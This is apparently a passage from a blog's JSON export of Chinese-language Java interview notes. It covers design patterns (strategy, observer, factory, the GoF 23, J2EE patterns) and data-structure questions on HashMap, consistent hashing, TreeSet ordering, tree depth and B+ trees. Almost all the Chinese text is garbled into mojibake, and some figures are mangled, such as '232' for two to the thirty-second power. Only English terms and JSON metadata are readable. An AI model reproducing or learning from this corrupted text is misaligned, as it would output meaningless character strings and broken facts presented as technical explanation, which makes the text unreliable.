ä½¿ç”¨ç­–ç•¥æ¨¡å¼å½“ç„¶ä¹Ÿæœ‰éœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼Œé‚£ä¹ˆå°±æ˜¯ç­–ç•¥ç±»ä¸è¦å¤ªå¤šï¼Œå¦‚æœä¸€ä¸ªç­–ç•¥å®¶æ—çš„å…·ä½“ç­–ç•¥æ•°é‡è¶…è¿‡4ä¸ªï¼Œåˆ™éœ€è¦è€ƒè™‘æ··åˆæ¨¡å¼ï¼Œè§£å†³ç­–ç•¥ç±»è†¨èƒ€å’Œå¯¹å¤–æš´éœ²é—®é¢˜ã€‚åœ¨å®é™…é¡¹ç›®ä¸­ï¼Œæˆ‘ä»¬ä¸€èˆ¬é€šè¿‡å·¥å‚æ–¹æ³•æ¨¡å¼æ¥å®ç°ç­–ç•¥ç±»çš„å£°æ˜ã€‚ å¯¹äºè®¾è®¡æ¨¡å¼ï¼Œä½ äº†è§£å“ªäº›ï¼Ÿè¯·æ‰‹å†™ä¸€ä¸‹è§‚å¯Ÿè€…æ¨¡å¼ã€‚ è§‚å¯Ÿè€…æ¨¡å¼ä¼˜ç‚¹ï¼š è§‚å¯Ÿè€…æ¨¡å¼åœ¨è¢«è§‚å¯Ÿè€…å’Œè§‚å¯Ÿè€…ä¹‹é—´å»ºç«‹ä¸€ä¸ªæŠ½è±¡çš„è€¦åˆã€‚è¢«è§‚å¯Ÿè€…è§’è‰²æ‰€çŸ¥é“çš„åªæ˜¯ä¸€ä¸ªå…·ä½“è§‚å¯Ÿè€…åˆ—è¡¨ï¼Œæ¯ä¸€ä¸ªå…·ä½“è§‚å¯Ÿè€…éƒ½ç¬¦åˆä¸€ä¸ªæŠ½è±¡è§‚å¯Ÿè€…çš„æ¥å£ã€‚è¢«è§‚å¯Ÿè€…å¹¶ä¸è®¤è¯†ä»»ä½•ä¸€ä¸ªå…·ä½“è§‚å¯Ÿè€…ï¼Œå®ƒåªçŸ¥é“å®ƒä»¬éƒ½æœ‰ä¸€ä¸ªå…±åŒçš„æ¥å£ã€‚ç”±äºè¢«è§‚å¯Ÿè€…å’Œè§‚å¯Ÿè€…æ²¡æœ‰ç´§å¯†åœ°è€¦åˆåœ¨ä¸€èµ·ï¼Œå› æ­¤å®ƒä»¬å¯ä»¥å±äºä¸åŒçš„æŠ½è±¡åŒ–å±‚æ¬¡ã€‚å¦‚æœè¢«è§‚å¯Ÿè€…å’Œè§‚å¯Ÿè€…éƒ½è¢«æ‰”åˆ°ä¸€èµ·ï¼Œé‚£ä¹ˆè¿™ä¸ªå¯¹è±¡å¿…ç„¶è·¨è¶ŠæŠ½è±¡åŒ–å’Œå…·ä½“åŒ–å±‚æ¬¡ã€‚ è§‚å¯Ÿè€…æ¨¡å¼ç¼ºç‚¹ï¼š å¦‚æœä¸€ä¸ªè¢«è§‚å¯Ÿè€…å¯¹è±¡æœ‰å¾ˆå¤šçš„ç›´æ¥å’Œé—´æ¥çš„è§‚å¯Ÿè€…çš„è¯ï¼Œå°†æ‰€æœ‰çš„è§‚å¯Ÿè€…éƒ½é€šçŸ¥åˆ°ä¼šèŠ±è´¹å¾ˆå¤šæ—¶é—´ã€‚ å¦‚æœåœ¨è¢«è§‚å¯Ÿè€…ä¹‹é—´æœ‰å¾ªç¯ä¾èµ–çš„è¯ï¼Œè¢«è§‚å¯Ÿè€…ä¼šè§¦å‘å®ƒä»¬ä¹‹é—´è¿›è¡Œå¾ªç¯è°ƒç”¨ï¼Œå¯¼è‡´ç³»ç»Ÿå´©æºƒã€‚åœ¨ä½¿ç”¨è§‚å¯Ÿè€…æ¨¡å¼æ˜¯è¦ç‰¹åˆ«æ³¨æ„è¿™ä¸€ç‚¹ã€‚ å¦‚æœå¯¹è§‚å¯Ÿè€…çš„é€šçŸ¥æ˜¯é€šè¿‡å¦å¤–çš„çº¿ç¨‹è¿›è¡Œå¼‚æ­¥æŠ•é€’çš„è¯ï¼Œç³»ç»Ÿå¿…é¡»ä¿è¯æŠ•é€’æ˜¯ä»¥è‡ªæ°çš„æ–¹å¼è¿›è¡Œçš„ã€‚ è™½ç„¶è§‚å¯Ÿè€…æ¨¡å¼å¯ä»¥éšæ—¶ä½¿è§‚å¯Ÿè€…çŸ¥é“æ‰€è§‚å¯Ÿçš„å¯¹è±¡å‘ç”Ÿäº†å˜åŒ–ï¼Œä½†æ˜¯è§‚å¯Ÿè€…æ¨¡å¼æ²¡æœ‰ç›¸åº”çš„æœºåˆ¶ä½¿è§‚å¯Ÿè€…çŸ¥é“æ‰€è§‚å¯Ÿçš„å¯¹è±¡æ˜¯æ€ä¹ˆå‘ç”Ÿå˜åŒ–çš„ã€‚ ä½ äº†è§£çš„ Javaè®¾è®¡æ¨¡å¼ã€‚ æ‰€è°“è®¾è®¡æ¨¡å¼ï¼Œå°±æ˜¯ä¸€å¥—è¢«åå¤ä½¿ç”¨çš„ä»£ç è®¾è®¡ç»éªŒçš„æ€»ç»“ï¼ˆæƒ…å¢ƒä¸­ä¸€ä¸ªé—®é¢˜ç»è¿‡è¯å®çš„ä¸€ä¸ªè§£å†³æ–¹æ¡ˆï¼‰ã€‚ä½¿ç”¨è®¾è®¡æ¨¡å¼æ˜¯ä¸ºäº†å¯é‡ç”¨ä»£ç ã€è®©ä»£ç æ›´å®¹æ˜“è¢«ä»–äººç†è§£ã€ä¿è¯ä»£ç å¯é æ€§ã€‚è®¾è®¡æ¨¡å¼ä½¿äººä»¬å¯ä»¥æ›´åŠ ç®€å•æ–¹ä¾¿çš„å¤ç”¨æˆåŠŸçš„è®¾è®¡å’Œä½“ç³»ç»“æ„ã€‚å°†å·²è¯å®çš„æŠ€æœ¯è¡¨è¿°æˆè®¾è®¡æ¨¡å¼ä¹Ÿä¼šä½¿æ–°ç³»ç»Ÿå¼€å‘è€…æ›´åŠ å®¹æ˜“ç†è§£å…¶è®¾è®¡æ€è·¯ã€‚åœ¨GoFçš„ã€ŠDesign Patterns: Elements of Reusable Object-Oriented Softwareã€‹ä¸­ç»™å‡ºäº†ä¸‰ç±»ï¼ˆåˆ›å»ºå‹[å¯¹ç±»çš„å®ä¾‹åŒ–è¿‡ç¨‹çš„æŠ½è±¡åŒ–]ã€ç»“æ„å‹[æè¿°å¦‚ä½•å°†ç±»æˆ–å¯¹è±¡ç»“åˆåœ¨ä¸€èµ·å½¢æˆæ›´å¤§çš„ç»“æ„]ã€è¡Œä¸ºå‹[å¯¹åœ¨ä¸åŒçš„å¯¹è±¡ä¹‹é—´åˆ’åˆ†è´£ä»»å’Œç®—æ³•çš„æŠ½è±¡åŒ–]ï¼‰å…±23ç§è®¾è®¡æ¨¡å¼ï¼ŒåŒ…æ‹¬ï¼šAbstract Factoryï¼ˆæŠ½è±¡å·¥å‚æ¨¡å¼ï¼‰ï¼ŒBuilderï¼ˆå»ºé€ è€…æ¨¡å¼ï¼‰ï¼ŒFactory Methodï¼ˆå·¥å‚æ–¹æ³•æ¨¡å¼ï¼‰ï¼ŒPrototypeï¼ˆåŸå§‹æ¨¡å‹æ¨¡å¼ï¼‰ï¼ŒSingletonï¼ˆå•ä¾‹æ¨¡å¼ï¼‰ï¼›Facadeï¼ˆé—¨é¢æ¨¡å¼ï¼‰ï¼ŒAdapterï¼ˆé€‚é…å™¨æ¨¡å¼ï¼‰ï¼ŒBridgeï¼ˆæ¡¥æ¢æ¨¡å¼ï¼‰ï¼ŒCompositeï¼ˆåˆæˆæ¨¡å¼ï¼‰ï¼ŒDecoratorï¼ˆè£…é¥°æ¨¡å¼ï¼‰ï¼ŒFlyweightï¼ˆäº«å…ƒæ¨¡å¼ï¼‰ï¼ŒProxyï¼ˆä»£ç†æ¨¡å¼ï¼‰ï¼›Commandï¼ˆå‘½ä»¤æ¨¡å¼ï¼‰ï¼ŒInterpreterï¼ˆè§£é‡Šå™¨æ¨¡å¼ï¼‰ï¼ŒVisitorï¼ˆè®¿é—®è€…æ¨¡å¼ï¼‰ï¼ŒIteratorï¼ˆè¿­ä»£å­æ¨¡å¼ï¼‰ï¼ŒMediatorï¼ˆè°ƒåœè€…æ¨¡å¼ï¼‰ï¼ŒMementoï¼ˆå¤‡å¿˜å½•æ¨¡å¼ï¼‰ï¼ŒObserverï¼ˆè§‚å¯Ÿè€…æ¨¡å¼ï¼‰ï¼ŒStateï¼ˆçŠ¶æ€æ¨¡å¼ï¼‰ï¼ŒStrategyï¼ˆç­–ç•¥æ¨¡å¼ï¼‰ï¼ŒTemplate Methodï¼ˆæ¨¡æ¿æ–¹æ³•æ¨¡å¼ï¼‰ï¼Œ Chain Of Responsibilityï¼ˆè´£ä»»é“¾æ¨¡å¼ï¼‰ã€‚ å¼€å‘ä¸­éƒ½ç”¨åˆ°äº† å“ªäº›è®¾è®¡æ¨¡å¼? ç”¨åœ¨ä»€ä¹ˆåœºåˆ? æ¯ä¸ªæ¨¡å¼éƒ½æè¿°äº†ä¸€ä¸ªåœ¨æˆ‘ä»¬çš„ç¯å¢ƒä¸­ä¸æ–­å‡ºç°çš„é—®é¢˜ï¼Œç„¶åæè¿°äº†è¯¥é—®é¢˜çš„è§£å†³æ–¹æ¡ˆçš„æ ¸å¿ƒã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œä½ å¯ä»¥æ— æ•°æ¬¡åœ°ä½¿ç”¨é‚£äº›å·²æœ‰çš„è§£å†³æ–¹æ¡ˆï¼Œæ— éœ€åœ¨é‡å¤ç›¸åŒçš„å·¥ä½œã€‚ä¸»è¦ç”¨åˆ°äº†MVCçš„è®¾è®¡æ¨¡å¼ã€‚ç”¨æ¥å¼€å‘JSP/Servletæˆ–è€…J2EEçš„ç›¸å…³åº”ç”¨ã€‚ç®€å•å·¥å‚æ¨¡å¼ç­‰ã€‚ J2EE çš„å¸¸ç”¨ è®¾è®¡æ¨¡å¼æœ‰å“ªäº›ï¼Ÿå†è¯¦ç»†è¯´è¯´å·¥å‚æ¨¡å¼ã€‚ Javaä¸­çš„23ç§è®¾è®¡æ¨¡å¼ï¼šFactoryï¼ˆå·¥å‚æ¨¡å¼ï¼‰ï¼Œ Builderï¼ˆå»ºé€ æ¨¡å¼ï¼‰ï¼Œ Factory Methodï¼ˆå·¥å‚æ–¹æ³•æ¨¡å¼ï¼‰ï¼ŒPrototypeï¼ˆåŸå§‹æ¨¡å‹æ¨¡å¼ï¼‰ï¼ŒSingletonï¼ˆå•ä¾‹æ¨¡å¼ï¼‰ï¼Œ Facadeï¼ˆé—¨é¢æ¨¡å¼ï¼‰ï¼ŒAdapterï¼ˆé€‚é…å™¨æ¨¡å¼ï¼‰ï¼Œ Bridgeï¼ˆæ¡¥æ¢æ¨¡å¼ï¼‰ï¼Œ Compositeï¼ˆåˆæˆæ¨¡å¼ï¼‰ï¼ŒDecoratorï¼ˆè£…é¥°æ¨¡å¼ï¼‰ï¼Œ Flyweightï¼ˆäº«å…ƒæ¨¡å¼ï¼‰ï¼Œ Proxyï¼ˆä»£ç†æ¨¡å¼ï¼‰ï¼ŒCommandï¼ˆå‘½ä»¤æ¨¡å¼ï¼‰ï¼Œ Interpreterï¼ˆè§£é‡Šå™¨æ¨¡å¼ï¼‰ï¼Œ Visitorï¼ˆè®¿é—®è€…æ¨¡å¼ï¼‰ï¼ŒIteratorï¼ˆè¿­ä»£å­æ¨¡å¼ï¼‰ï¼Œ Mediatorï¼ˆè°ƒåœè€…æ¨¡å¼ï¼‰ï¼Œ Mementoï¼ˆå¤‡å¿˜å½•æ¨¡å¼ï¼‰ï¼ŒObserverï¼ˆè§‚å¯Ÿè€…æ¨¡å¼ï¼‰ï¼Œ Stateï¼ˆçŠ¶æ€æ¨¡å¼ï¼‰ï¼Œ Strategyï¼ˆç­–ç•¥æ¨¡å¼ï¼‰ï¼ŒTemplate Methodï¼ˆæ¨¡æ¿æ–¹æ³•æ¨¡å¼ï¼‰ï¼Œ Chain Of Responsibleityï¼ˆè´£ä»»é“¾æ¨¡å¼ï¼‰å·¥å‚æ¨¡å¼ï¼šå·¥å‚æ¨¡å¼æ˜¯ä¸€ç§ç»å¸¸è¢«ä½¿ç”¨åˆ°çš„æ¨¡å¼ï¼Œæ ¹æ®å·¥å‚æ¨¡å¼å®ç°çš„ç±»å¯ä»¥æ ¹æ®æä¾›çš„æ•°æ®ç”Ÿæˆä¸€ç»„ç±»ä¸­æŸä¸€ä¸ªç±»çš„å®ä¾‹ï¼Œé€šå¸¸è¿™ä¸€ç»„ç±»æœ‰ä¸€ä¸ªå…¬å…±çš„æŠ½è±¡çˆ¶ç±»å¹¶ä¸”å®ç°äº†ç›¸åŒçš„æ–¹æ³•ï¼Œä½†æ˜¯è¿™äº›æ–¹æ³•é’ˆå¯¹ä¸åŒçš„æ•°æ®è¿›è¡Œäº†ä¸åŒçš„æ“ä½œã€‚é¦–å…ˆéœ€è¦å®šä¹‰ä¸€ä¸ªåŸºç±»ï¼Œè¯¥ç±»çš„å­ç±»é€šè¿‡ä¸åŒçš„æ–¹æ³•å®ç°äº†åŸºç±»ä¸­çš„æ–¹æ³•ã€‚ç„¶åéœ€è¦å®šä¹‰ä¸€ä¸ªå·¥å‚ç±»ï¼Œå·¥å‚ç±»å¯ä»¥æ ¹æ®æ¡ä»¶ç”Ÿæˆä¸åŒçš„å­ç±»å®ä¾‹ã€‚å½“å¾—åˆ°å­ç±»çš„å®ä¾‹åï¼Œå¼€å‘äººå‘˜å¯ä»¥è°ƒç”¨åŸºç±»ä¸­çš„æ–¹æ³•è€Œä¸å¿…è€ƒè™‘åˆ°åº•è¿”å›çš„æ˜¯å“ªä¸€ä¸ªå­ç±»çš„å®ä¾‹ã€‚ è¯´è¯´ä½ æ‰€ç†Ÿæ‚‰ æˆ–å¬è¯´è¿‡çš„ï¼ŒJ2EEä¸­çš„å‡ ç§å¸¸ç”¨æ¨¡å¼ã€‚å†è®²è®²ä½ å¯¹è®¾è®¡æ¨¡å¼çš„ä¸€äº›çœ‹æ³• Session Facade Patternï¼šä½¿ç”¨SessionBeanè®¿é—®EntityBean Message Facade Patternï¼šå®ç°å¼‚æ­¥è°ƒç”¨EJB Command Patternï¼šä½¿ç”¨Command JavaBeanså–ä»£SessionBeanï¼Œå®ç°è½»é‡çº§è®¿é—®Data Transfer Object Factoryï¼šé€šè¿‡DTO Factoryç®€åŒ–EntityBeanæ•°æ®æä¾›ç‰¹æ€§Generic Attribute Accessï¼šé€šè¿‡AttibuteAccessæ¥å£ç®€åŒ–EntityBeanæ•°æ®æä¾›ç‰¹æ€§Business Interfaceï¼šé€šè¿‡è¿œç¨‹ï¼ˆæœ¬åœ°ï¼‰æ¥å£å’ŒBeanç±»å®ç°ç›¸åŒæ¥å£è§„èŒƒä¸šåŠ¡é€»è¾‘ä¸€è‡´æ€§ï¼¥ï¼ªï¼¢æ¶æ„çš„è®¾è®¡å¥½åå°†ç›´æ¥å½±å“ç³»ç»Ÿçš„æ€§èƒ½ã€å¯æ‰©å±•æ€§ã€å¯ç»´æŠ¤æ€§ã€ç»„ä»¶å¯é‡ç”¨æ€§åŠå¼€å‘æ•ˆç‡ã€‚é¡¹ç›®è¶Šå¤æ‚ï¼Œé¡¹ç›®é˜Ÿä¼è¶Šåºå¤§åˆ™è¶Šèƒ½ä½“ç°è‰¯å¥½è®¾è®¡çš„é‡è¦æ€§ã€‚","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://blog.kayleh.top/tags/Interview/"}]},{"title":"æ•°æ®ç»“æ„ä¸ç®—æ³•","slug":"æ•°æ®ç»“æ„ä¸ç®—æ³•","date":"2020-07-24T01:19:17.000Z","updated":"2021-04-11T17:11:28.911Z","comments":true,"path":"æ•°æ®ç»“æ„ä¸ç®—æ³•/","link":"","permalink":"https://blog.kayleh.top/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/","excerpt":"æ•°æ®ç»“æ„ä¸ç®—æ³•","text":"æ•°æ®ç»“æ„ä¸ç®—æ³• å“ˆå¸ŒhashCode() å’Œequals() æ–¹æ³•çš„é‡è¦æ€§ä½“ç°åœ¨ä»€ä¹ˆåœ°æ–¹ï¼Ÿ Javaä¸­çš„HashMapä½¿ç”¨hashCode()å’Œequals()æ–¹æ³•æ¥ç¡®å®šé”®å€¼å¯¹çš„ç´¢å¼•ï¼Œå½“æ ¹æ®é”®è·å–å€¼çš„æ—¶å€™ä¹Ÿä¼šç”¨åˆ°è¿™ä¸¤ä¸ªæ–¹æ³•ã€‚å¦‚æœæ²¡æœ‰æ­£ç¡®çš„å®ç°è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œä¸¤ä¸ªä¸åŒçš„é”®å¯èƒ½ä¼šæœ‰ç›¸åŒçš„hashå€¼ï¼Œå› æ­¤ï¼Œå¯èƒ½ä¼šè¢«é›†åˆè®¤ä¸ºæ˜¯ç›¸ç­‰çš„ã€‚è€Œä¸”ï¼Œè¿™ä¸¤ä¸ªæ–¹æ³•ä¹Ÿç”¨æ¥å‘ç°é‡å¤å…ƒç´ ã€‚æ‰€ä»¥è¿™ä¸¤ä¸ªæ–¹æ³•çš„å®ç°å¯¹HashMapçš„ç²¾ç¡®æ€§å’Œæ­£ç¡®æ€§æ˜¯è‡³å…³é‡è¦çš„ã€‚ Javaä¸­çš„HashMapçš„å·¥ä½œåŸç†æ˜¯ä»€ä¹ˆï¼ŸHashMapç±»æœ‰ä¸€ä¸ªå«åšEntryçš„å†…éƒ¨ç±»ã€‚è¿™ä¸ªEntryç±»åŒ…å«äº†key-valueä½œä¸ºå®ä¾‹å˜é‡ã€‚ æ¯å½“å¾€hashmapé‡Œé¢å­˜æ”¾key-valueå¯¹çš„æ—¶å€™ï¼Œéƒ½ä¼šä¸ºå®ƒä»¬å®ä¾‹åŒ–ä¸€ä¸ªEntryå¯¹è±¡ï¼Œè¿™ä¸ªEntryå¯¹è±¡å°±ä¼šå­˜å‚¨åœ¨å‰é¢æåˆ°çš„Entryæ•°ç»„tableä¸­ã€‚Entryå…·ä½“å­˜åœ¨tableçš„é‚£ä¸ªä½ç½®æ˜¯ æ ¹æ®keyçš„hashcode()æ–¹æ³•è®¡ç®—å‡ºæ¥çš„hashå€¼ï¼ˆæ¥å†³å®šï¼‰ã€‚ ä»€ä¹ˆæ˜¯hashmap?HashMap æ˜¯ä¸€ä¸ªæ•£åˆ—è¡¨ï¼Œå®ƒå­˜å‚¨çš„å†…å®¹æ˜¯é”®å€¼å¯¹(key-value)æ˜ å°„ã€‚HashMap ç»§æ‰¿äºAbstractMapï¼Œå®ç°äº†Mapã€Cloneableã€java.io.Serializableæ¥å£ã€‚HashMap çš„å®ç°ä¸æ˜¯åŒæ­¥çš„ï¼Œè¿™æ„å‘³ç€å®ƒä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚å®ƒçš„keyã€valueéƒ½å¯ä»¥ä¸ºnullã€‚æ­¤å¤–ï¼ŒHashMapä¸­çš„æ˜ å°„ä¸æ˜¯æœ‰åºçš„ã€‚ HashMap çš„å®ä¾‹æœ‰ä¸¤ä¸ªå‚æ•°å½±å“å…¶æ€§èƒ½ï¼šâ€œåˆå§‹å®¹é‡â€ å’Œ â€œåŠ è½½å› å­â€ã€‚å®¹é‡ æ˜¯å“ˆå¸Œè¡¨ä¸­æ¡¶çš„æ•°é‡ï¼Œåˆå§‹å®¹é‡ åªæ˜¯å“ˆå¸Œè¡¨åœ¨åˆ›å»ºæ—¶çš„å®¹é‡ã€‚åŠ è½½å› å­ æ˜¯å“ˆå¸Œè¡¨åœ¨å…¶å®¹é‡è‡ªåŠ¨å¢åŠ ä¹‹å‰å¯ä»¥è¾¾åˆ°å¤šæ»¡çš„ä¸€ç§å°ºåº¦ã€‚å½“å“ˆå¸Œè¡¨ä¸­çš„æ¡ç›®æ•°è¶…å‡ºäº†åŠ è½½å› å­ä¸å½“å‰å®¹é‡çš„ä¹˜ç§¯æ—¶ï¼Œåˆ™è¦å¯¹è¯¥å“ˆå¸Œè¡¨è¿›è¡Œ rehash æ“ä½œï¼ˆå³é‡å»ºå†…éƒ¨æ•°æ®ç»“æ„ï¼‰ï¼Œä»è€Œå“ˆå¸Œè¡¨å°†å…·æœ‰å¤§çº¦ä¸¤å€çš„æ¡¶æ•°ã€‚é€šå¸¸ï¼Œé»˜è®¤åŠ è½½å› å­æ˜¯ 0.75, è¿™æ˜¯åœ¨æ—¶é—´å’Œç©ºé—´æˆæœ¬ä¸Šå¯»æ±‚ä¸€ç§æŠ˜è¡·ã€‚åŠ è½½å› å­è¿‡é«˜è™½ç„¶å‡å°‘äº†ç©ºé—´å¼€é”€ï¼Œä½†åŒæ—¶ä¹Ÿå¢åŠ äº†æŸ¥è¯¢æˆæœ¬ï¼ˆåœ¨å¤§å¤šæ•° HashMap ç±»çš„æ“ä½œä¸­ï¼ŒåŒ…æ‹¬ get å’Œ put æ“ä½œï¼Œéƒ½åæ˜ äº†è¿™ä¸€ç‚¹ï¼‰ã€‚åœ¨è®¾ç½®åˆå§‹å®¹é‡æ—¶åº”è¯¥è€ƒè™‘åˆ°æ˜ å°„ä¸­æ‰€éœ€çš„æ¡ç›®æ•°åŠå…¶åŠ è½½å› å­ï¼Œä»¥ä¾¿æœ€å¤§é™åº¦åœ°å‡å°‘ rehash æ“ä½œæ¬¡æ•°ã€‚å¦‚æœåˆå§‹å®¹é‡å¤§äºæœ€å¤§æ¡ç›®æ•°é™¤ä»¥åŠ è½½å› å­ï¼Œåˆ™ä¸ä¼šå‘ç”Ÿ rehash æ“ä½œã€‚ hashmapå…±æœ‰4ä¸ªæ„é€ å‡½æ•°ï¼š // é»˜è®¤æ„é€ å‡½æ•°ã€‚HashMap() // æŒ‡å®šâ€œå®¹é‡å¤§å°â€çš„æ„é€ å‡½æ•° HashMap(int capacity) // æŒ‡å®šâ€œå®¹é‡å¤§å°â€å’Œâ€œåŠ è½½å› å­â€çš„æ„é€ å‡½æ•° HashMap(int capacity, float loadFactor) // åŒ…å«â€œå­Mapâ€çš„æ„é€ å‡½æ•° HashMap(Map&lt;? extends K, ? extends V&gt; map) å¦‚ä½•æ„é€ ä¸€è‡´æ€§ å“ˆå¸Œç®—æ³•ã€‚å…ˆæ„é€ ä¸€ä¸ªé•¿åº¦ä¸º232çš„æ•´æ•°ç¯ï¼ˆè¿™ä¸ªç¯è¢«ç§°ä¸ºä¸€è‡´æ€§Hashç¯ï¼‰ï¼Œæ ¹æ®èŠ‚ç‚¹åç§°çš„Hashå€¼ï¼ˆå…¶åˆ†å¸ƒä¸º[0, 232-1]ï¼‰å°†æœåŠ¡å™¨èŠ‚ç‚¹æ”¾ç½®åœ¨è¿™ä¸ªHashç¯ä¸Šï¼Œç„¶åæ ¹æ®æ•°æ®çš„Keyå€¼è®¡ç®—å¾—åˆ°å…¶Hashå€¼ï¼ˆå…¶åˆ†å¸ƒä¹Ÿä¸º[0, 232-1]ï¼‰ï¼Œæ¥ç€åœ¨Hashç¯ä¸Šé¡ºæ—¶é’ˆæŸ¥æ‰¾è·ç¦»è¿™ä¸ªKeyå€¼çš„Hashå€¼æœ€è¿‘çš„æœåŠ¡å™¨èŠ‚ç‚¹ï¼Œå®ŒæˆKeyåˆ°æœåŠ¡å™¨çš„æ˜ å°„æŸ¥æ‰¾ã€‚ è¿™ç§ç®—æ³•è§£å†³äº†æ™®é€šä½™æ•°Hashç®—æ³•ä¼¸ç¼©æ€§å·®çš„é—®é¢˜ï¼Œå¯ä»¥ä¿è¯åœ¨ä¸Šçº¿ã€ä¸‹çº¿æœåŠ¡å™¨çš„æƒ…å†µä¸‹å°½é‡æœ‰å¤šçš„è¯·æ±‚å‘½ä¸­åŸæ¥è·¯ç”±åˆ°çš„æœåŠ¡å™¨ã€‚ Objectä½œä¸ºHashMapçš„keyçš„è¯ï¼Œå¯¹Objectæœ‰ä»€ä¹ˆè¦æ±‚å—ï¼Ÿ è¦æ±‚Objectä¸­hashcodeä¸èƒ½å˜ã€‚ hashset å­˜çš„æ•°æ˜¯æœ‰åºçš„å—ï¼Ÿ Hashsetæ˜¯æ— åºçš„ã€‚ æ ‘TreeMapå’ŒTreeSetåœ¨æ’åºæ—¶å¦‚ä½•æ¯”è¾ƒå…ƒç´ ï¼ŸCollectionså·¥å…·ç±»ä¸­çš„sort()æ–¹æ³•å¦‚ä½•æ¯”è¾ƒå…ƒç´ ï¼ŸTreeSetè¦æ±‚å­˜æ”¾çš„å¯¹è±¡æ‰€å±çš„ç±»å¿…é¡»å®ç°Comparableæ¥å£ï¼Œè¯¥æ¥å£æä¾›äº†æ¯”è¾ƒå…ƒç´ çš„compareTo()æ–¹æ³•ï¼Œå½“æ’å…¥å…ƒç´ æ—¶ä¼šå›è°ƒè¯¥æ–¹æ³•æ¯”è¾ƒå…ƒç´ çš„å¤§å°ã€‚TreeMapè¦æ±‚å­˜æ”¾çš„é”®å€¼å¯¹æ˜ å°„çš„é”®å¿…é¡»å®ç°Comparableæ¥å£ä»è€Œæ ¹æ®é”®å¯¹å…ƒç´ è¿›è¡Œæ’åºã€‚Collectionså·¥å…·ç±»çš„sortæ–¹æ³•æœ‰ä¸¤ç§é‡è½½çš„å½¢å¼ï¼Œç¬¬ä¸€ç§è¦æ±‚ä¼ å…¥çš„å¾…æ’åºå®¹å™¨ä¸­å­˜æ”¾çš„å¯¹è±¡æ¯”è¾ƒå®ç°Comparableæ¥å£ä»¥å®ç°å…ƒç´ çš„æ¯”è¾ƒï¼›ç¬¬äºŒç§ä¸å¼ºåˆ¶æ€§çš„è¦æ±‚å®¹å™¨ä¸­çš„å…ƒç´ å¿…é¡»å¯æ¯”è¾ƒï¼Œä½†æ˜¯è¦æ±‚ä¼ å…¥ç¬¬äºŒä¸ªå‚æ•°ï¼Œå‚æ•°æ˜¯Comparatoræ¥å£çš„å­ç±»å‹ï¼ˆéœ€è¦é‡å†™compareæ–¹æ³•å®ç°å…ƒç´ çš„æ¯”è¾ƒï¼‰ï¼Œç›¸å½“äºä¸€ä¸ªä¸´æ—¶å®šä¹‰çš„æ’åºè§„åˆ™ï¼Œå…¶å®å°±æ˜¯é€šè¿‡æ¥å£æ³¨å…¥æ¯”è¾ƒå…ƒç´ å¤§å°çš„ç®—æ³•ï¼Œä¹Ÿæ˜¯å¯¹å›è°ƒæ¨¡å¼çš„åº”ç”¨ï¼ˆJavaä¸­å¯¹å‡½æ•°å¼ç¼–ç¨‹çš„æ”¯æŒï¼‰ã€‚ å¦‚ä½•çŸ¥é“äºŒå‰æ ‘çš„æ·±åº¦ï¼Ÿå®ç°äºŒå‰æ ‘çš„æ·±åº¦æ–¹å¼æœ‰ä¸¤ç§ï¼Œé€’å½’ä»¥åŠéé€’å½’ã€‚ â‘ é€’å½’å®ç°ï¼š ä¸ºäº†æ±‚æ ‘çš„æ·±åº¦ï¼Œå¯ä»¥å…ˆæ±‚å…¶å·¦å­æ ‘çš„æ·±åº¦å’Œå³å­æ ‘çš„æ·±åº¦ï¼Œå¯ä»¥ç”¨é€’å½’å®ç°ï¼Œé€’å½’çš„å‡ºå£å°±æ˜¯èŠ‚ç‚¹ä¸ºç©ºã€‚è¿”å›å€¼ä¸º0ï¼› â‘¡éé€’å½’å®ç°ï¼š åˆ©ç”¨å±‚æ¬¡éå†çš„ç®—æ³•ï¼Œè®¾ç½®å˜é‡levelè®°å½•å½“å‰èŠ‚ç‚¹æ‰€åœ¨çš„å±‚æ•°ï¼Œè®¾ç½®å˜é‡lastæŒ‡å‘å½“å‰å±‚çš„æœ€åä¸€ä¸ªèŠ‚ç‚¹ï¼Œå½“å¤„ç†å®Œå½“å‰å±‚çš„æœ€åä¸€ä¸ªèŠ‚ç‚¹ï¼Œè®©levelæŒ‡å‘+1æ“ä½œã€‚è®¾ç½®å˜é‡curè®°å½•å½“å‰å±‚å·²ç»è®¿é—®çš„èŠ‚ç‚¹çš„ä¸ªæ•°ï¼Œå½“curç­‰äºlastæ—¶ï¼Œè¡¨ç¤ºè¯¥å±‚è®¿é—®ç»“æŸã€‚ å±‚æ¬¡éå†åœ¨æ±‚æ ‘çš„å®½åº¦ã€è¾“å‡ºæŸä¸€å±‚èŠ‚ç‚¹ï¼ŒæŸä¸€å±‚èŠ‚ç‚¹ä¸ªæ•°ï¼Œæ¯ä¸€å±‚èŠ‚ç‚¹ä¸ªæ•°éƒ½å¯ä»¥é‡‡å–ç±»ä¼¼çš„ç®—æ³•ã€‚ æ ‘çš„å®½åº¦ï¼šåœ¨æ ‘çš„æ·±åº¦ç®—æ³•åŸºç¡€ä¸Šï¼ŒåŠ ä¸€ä¸ªè®°å½•è®¿é—®è¿‡çš„å±‚èŠ‚ç‚¹ä¸ªæ•°æœ€å¤šçš„å˜é‡max,åœ¨è®¿é—®æ¯å±‚å‰maxä¸lastæ¯”è¾ƒï¼Œå¦‚æœmaxæ¯”è¾ƒå¤§ï¼Œmaxä¸å˜ï¼Œå¦‚æœmaxå°äºlastï¼ŒæŠŠlastèµ‹å€¼ç»™max; B+æ ‘å’ŒB-æ ‘ï¼Ÿb+æ ‘çš„ä¸­é—´èŠ‚ç‚¹ä¸ä¿å­˜æ•°æ®ï¼Œæ‰€ä»¥ç£ç›˜é¡µèƒ½å®¹çº³æ›´å¤šèŠ‚ç‚¹å…ƒç´ ï¼Œæ›´â€œçŸ®èƒ–â€ï¼› b+æ ‘æŸ¥è¯¢å¿…é¡»æŸ¥æ‰¾åˆ°å¶å­èŠ‚ç‚¹ï¼Œbæ ‘åªè¦åŒ¹é…åˆ°å³å¯ä¸ç”¨ç®¡å…ƒç´ ä½ç½®ï¼Œå› æ­¤b+æ ‘æŸ¥æ‰¾æ›´ç¨³å®šï¼ˆå¹¶ä¸æ…¢ï¼‰ï¼› 